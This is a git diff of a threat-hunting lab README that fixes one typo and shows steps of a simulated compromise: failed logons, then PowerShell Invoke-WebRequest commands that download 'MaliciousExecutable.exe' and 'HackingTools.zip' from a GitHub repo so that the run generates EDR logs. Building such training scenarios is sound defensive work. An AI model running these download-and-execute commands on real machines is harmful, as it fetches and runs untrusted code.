@@ -10,7 +10,7 @@ The "malicious" executable used within the project was originally written as a P
 1. Several failed user logons in quick succession.
 2. Opened a PowerShell terminal and executed the command `Invoke-WebRequest -Uri \"https://github.com/AaronRMartinez/Threat-Hunting-Scenario-Compromise/raw/refs/heads/main/MaliciousExecutable.exe\" -OutFile \"$env:USERPROFILE\\Downloads\\MaliciousExecutable.exe\"` to initiate the `MaliciousExecutable.exe` download.
 3. Once `MaliciousExecutable.exe` was downloaded, the threat actor simply double-clicked the executable to run it. 
-4. When executed, `MaliciousExecutable.exe` ran several encoded PowerShell commannds to populate the EDR logs. These commands consisted of:
+4. When executed, `MaliciousExecutable.exe` ran several encoded PowerShell commands to populate the EDR logs. These commands consisted of:
 
    - First Command: `Invoke-WebRequest -Uri "https://github.com/AaronRMartinez/Threat-Hunting-Scenario-Compromise/raw/refs/heads/main/HackingTools.zip" -OutFile "$env:USERPROFILE\Downloads\HackingTools.zip"`
 
